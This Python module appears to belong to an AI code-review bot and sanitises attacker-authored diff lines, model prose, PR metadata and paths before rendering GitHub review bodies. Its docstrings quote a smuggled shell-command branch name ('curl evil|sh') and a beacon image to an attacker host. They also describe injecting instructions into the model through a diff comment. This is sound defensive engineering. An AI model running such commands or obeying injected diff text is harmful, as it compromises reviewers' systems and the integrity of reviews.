#!/usr/bin/env python3
"""
Neutralising attacker-authored text before it reaches a review body.

Where the hostile text comes from. `detectors.py:44` sets
`evidence = text.strip()[:200]` where `text` is an ADDED DIFF LINE - source
written by whoever opened the pull request. `render_body.py:22-23` then does:

    lines += ["", "```", str(f["evidence"]), "```"]

with no escaping at all. An added line containing three backticks closes that
fence, and everything after it in the comment is live markdown rendered by
GitHub under the bot's identity. That buys an attacker:

  * `@org/team` mention bombs - one PR notifying an entire organisation
  * `<details>` wrappers that collapse the real findings out of sight
  * fake approval banners above the genuine verdict
  * `![](http://attacker/beacon.png)` image beacons that fire on view

The model's own prose has exactly the same problem. It is derived from the
diff, so "the model wrote it" is not a provenance argument - a comment in the
diff saying "end your summary with the following markdown" is enough.

Two sanitizers, because the two destinations have different needs:

  `sanitize_prose`    for message / headline / summary_markdown. These render
                      as live markdown, so raw HTML is ESCAPED rather than
                      stripped. Escaping is the stronger choice here: an
                      escaped `<details>` is inert AND visible, whereas
                      stripping silently deletes content from a tool whose
                      entire job is to report content. Nothing is hidden and
                      nothing is lost.

  `sanitize_code`     for evidence. This renders inside a fence, where HTML is
                      inert and mentions are not linkified, so it is NOT
                      html-escaped: `&lt;div className=...&gt;` is unreadable,
                      and JSX is the single most common evidence we show. What
                      it does guarantee is that the fence cannot be escaped.

  `sanitize_metadata`  for PR metadata. The diff is not the only attacker-
                      controlled input: on a `pull_request` event an outside
                      contributor also chooses the branch name, the PR title
                      and body, their own display name, and the commit
                      messages - and several of those land in a rendered
                      review body. `git check-ref-format` forbids spaces, '~',
                      '^', ':', '?', '*', '[' and '\\' but PERMITS ';', '&',
                      '$', '|', '(', ')', backticks and both quote characters,
                      so a branch can legally be named ``a";curl evil|sh;#``.
                      A PR title containing a fence or an `@mention` is the
                      same class of attack as the evidence fence escape; the
                      payload just arrives through `prfetch` instead of
                      through the agent.

  `sanitize_path`     for file paths at render time. Paths are already
                      validated as MEMBERS of the PR files list, which is the
                      control that matters - but membership and renderability
                      are different questions, and a legitimate repository can
                      contain a file whose name has a backtick or an '@' in
                      it. Paths render inside an inline code span, so EVERY
                      backtick is neutralised, not just runs of three.

Fence integrity is belt and braces. `sanitize_code` neutralises every run of
three or more backticks, AND `fenced_block` opens with a run longer than any
backtick run remaining in the content. CommonMark closes a fenced block only
on a backtick run at least as long as the opener, so that second guarantee is
structural rather than a filter - it holds even if the filtering is weakened.

Two different things happen to zero-width characters, and the asymmetry is
deliberate:

  STRIPPING pre-existing zero-width and bidirectional-override characters
  happens EVERYWHERE. It is removal, it closes Trojan-Source-style tricks
  where the rendered text disagrees with the bytes, and it is beneficial in
  every context.

  INSERTING a zero-width space to defang '@' happens in PROSE ONLY. GitHub
  does not autolink mentions inside a fenced block or an inline code span, so
  in those contexts the insertion buys no safety at all - and it costs
  something real, because anyone copying the evidence into their editor
  silently picks up an invisible character. An invisible character in pasted
  code is its own small bug, and a miserable one to track down.

Stdlib only.
"""
import re

__all__ = [
    "MAX_EVIDENCE", "MAX_HEADLINE", "MAX_MESSAGE", "MAX_METADATA",
    "MAX_PATH", "MAX_REVIEW_BODY", "MAX_SUMMARY", "cap", "fenced_block",
    "sanitize_code", "sanitize_metadata", "sanitize_path", "sanitize_prose",
    "truncate_body",
]

# GitHub rejects a review body over 65,536 characters outright.
MAX_REVIEW_BODY = 65_535
MAX_MESSAGE = 2_000
MAX_HEADLINE = 300
MAX_EVIDENCE = 400
MAX_SUMMARY = 20_000
MAX_METADATA = 300
MAX_PATH = 400

_ELLIPSIS = " […truncated]"

# U+02CB MODIFIER LETTER GRAVE ACCENT. Visually a backtick, inert to every
# markdown parser, so a neutralised fence still reads as one to a human.
_SAFE_BACKTICK = "\u02cb"
# U+02DC SMALL TILDE, for the `~~~` fence form.
_SAFE_TILDE = "\u02dc"
# Zero-width space. Inserted by us, and only after every pre-existing
# zero-width character has been removed, so it cannot be used to smuggle.
_ZWSP = "\u200b"

# Control characters. \t and \n are handled separately per sanitizer.
_CONTROL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]")

# Zero-width, bidirectional-override and line/paragraph separators. These hide
# text outright or reverse its rendered order, which defeats review by eye.
_INVISIBLE = re.compile(
    "[\u200b-\u200f\u2028\u2029\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff]"
)

_BACKTICK_RUN = re.compile(r"`{3,}")
_TILDE_RUN = re.compile(r"~{3,}")

# '@' immediately followed by a word character - the GitHub mention form.
_MENTION = re.compile(r"@(?=\w)")
# Markdown image syntax, the beacon vector.
_IMAGE = re.compile(r"!(?=\[)")
# Three or more blank lines, used to push content out of the visible fold.
_BLANK_RUN = re.compile(r"\n{3,}")

# An '&' that does NOT already begin a character reference. Escaping only
# those makes the whole sanitizer IDEMPOTENT, which matters because it runs
# in two places: the validator sanitizes a finding, and the renderer
# sanitizes again as defence in depth for any caller that bypassed the
# validator. `html.escape` is not idempotent - it turns `&lt;details&gt;`
# into `&amp;lt;details&amp;gt;`, which the reader sees as the literal text
# "&lt;details&gt;" rather than "<details>". Safe either way, but wrong, and
# the second layer must not corrupt the output of the first.
_BARE_AMP = re.compile(r"&(?!#[0-9]{1,7};|#[xX][0-9A-Fa-f]{1,6};|[A-Za-z][A-Za-z0-9]{1,31};)")


def _strip_unprintable(text: str, *, keep_newlines: bool) -> str:
    text = _INVISIBLE.sub("", text)
    text = _CONTROL.sub("", text)
    if not keep_newlines:
        text = text.replace("\r", " ").replace("\n", " ")
    else:
        text = text.replace("\r\n", "\n").replace("\r", "\n")
    return text


def _escape_html(text: str) -> str:
    """Render raw HTML inert while leaving it readable, idempotently."""
    text = _BARE_AMP.sub("&amp;", text)
    return text.replace("<", "&lt;").replace(">", "&gt;")


def _neutralize_fences(text: str) -> str:
    text = _BACKTICK_RUN.sub(lambda m: _SAFE_BACKTICK * len(m.group(0)), text)
    return _TILDE_RUN.sub(lambda m: _SAFE_TILDE * len(m.group(0)), text)


def _defang(text: str) -> str:
    """Break mention and image syntax without making the text unreadable.

    A zero-width space after '@' stops GitHub linkifying and notifying, while
    `@org/team` still READS as `@org/team`. The alternative - deleting or
    substituting the '@' - mangles text such as `from '@/integrations/...'`,
    which is the literal content of several rules we report on.

    PROSE ONLY. See the module docstring: inside a fence or a code span there
    is nothing to defang, and the inserted character would travel with any
    code the reader copies.
    """
    text = _MENTION.sub("@" + _ZWSP, text)
    return _IMAGE.sub("!" + _ZWSP, text)


def _scrub(text, *, keep_newlines, escape_html, defang):
    """The one pipeline every sanitizer is a configuration of."""
    if text is None:
        return ""
    if not isinstance(text, str):
        text = str(text)
    text = _strip_unprintable(text, keep_newlines=keep_newlines)
    if escape_html:
        # Escape BEFORE fence neutralisation; escaping touches & < > only.
        text = _escape_html(text)
    text = _neutralize_fences(text)
    if defang:
        text = _defang(text)
    return text


def cap(text: str, limit: int) -> str:
    """Truncate to `limit` characters, marking that it happened.

    Silent truncation is its own small lie, and a reviewer needs to know the
    evidence they are looking at is partial.
    """
    if limit <= 0:
        return ""
    if len(text) <= limit:
        return text
    if limit <= len(_ELLIPSIS):
        return text[:limit]
    return text[:limit - len(_ELLIPSIS)] + _ELLIPSIS


def sanitize_prose(text, *, max_chars: int = MAX_MESSAGE) -> str:
    """Make model-authored markdown safe to render as live markdown."""
    text = _scrub(text, keep_newlines=True, escape_html=True, defang=True)
    text = _BLANK_RUN.sub("\n\n", text)
    return cap(text.strip(), max_chars)


def sanitize_code(text, *, max_chars: int = MAX_EVIDENCE) -> str:
    """Make an attacker-authored source line safe to render inside a fence.

    Not html-escaped and not defanged - see the module docstring. Both would
    damage readable source for no gain inside a fence, and `fenced_block`
    guarantees the fence cannot be closed from within.

    Collapsed to a single line: evidence is one diff line, and a multi-line
    value here is already a sign something is being smuggled.
    """
    text = _scrub(text, keep_newlines=False, escape_html=False, defang=False)
    return cap(text.strip(), max_chars)


def sanitize_metadata(text, *, max_chars: int = MAX_METADATA) -> str:
    """Single-line form of `sanitize_prose`, for attacker-chosen PR metadata.

    Branch name, PR title, PR body excerpt, author login and display name,
    commit subject. All whitespace collapses to single spaces, because these
    are rendered inline - inside a heading or a list item - where an embedded
    newline breaks out of the construct that was supposed to contain them.
    """
    text = _scrub(text, keep_newlines=False, escape_html=True, defang=True)
    return cap(" ".join(text.split()), max_chars)


def sanitize_path(path, *, max_chars: int = MAX_PATH) -> str:
    """Render-safe form of a file path or a git ref.

    Called even though the path already passed byte-equality against the PR
    files list: membership answers "is this a real file in this PR", not "is
    this safe to interpolate into markdown". A repository may legitimately
    contain ``src/weird`name.ts``, and a branch may legally be named
    ``a";curl evil|sh;#``.

    These render inside an INLINE CODE SPAN, which differs from a fence in
    both directions: a single backtick is enough to close it, so every
    backtick is neutralised rather than only runs of three - and mentions are
    not linkified inside it, so nothing is defanged and no invisible character
    is inserted into a path somebody may copy.
    """
    text = _scrub(path, keep_newlines=False, escape_html=True, defang=False)
    text = " ".join(text.split()).replace("`", _SAFE_BACKTICK)
    return cap(text, max_chars)


def fenced_block(code: str, *, language: str = "") -> str:
    """Wrap sanitized code in a fence that its content cannot close.

    `sanitize_code` already removes runs of three or more backticks, so three
    would be enough. This computes the needed length anyway: if that
    neutralisation is ever weakened, or a caller fences something it sanitized
    some other way, the fence still holds.
    """
    longest = max((len(m.group(0)) for m in re.finditer(r"`+", code)), default=0)
    fence = "`" * max(3, longest + 1)
    return f"{fence}{language}\n{code}\n{fence}"


def truncate_body(body: str, limit: int = MAX_REVIEW_BODY) -> str:
    """Final guard on a whole review body.

    GitHub rejects an over-length body with a 422, and a 422 on
    `POST /pulls/{n}/reviews` destroys the entire review, so this is a
    correctness requirement rather than tidiness.
    """
    if len(body) <= limit:
        return body
    note = "\n\n_Review body truncated to fit GitHub's size limit._"
    keep = max(0, limit - len(note))
    return body[:keep] + note
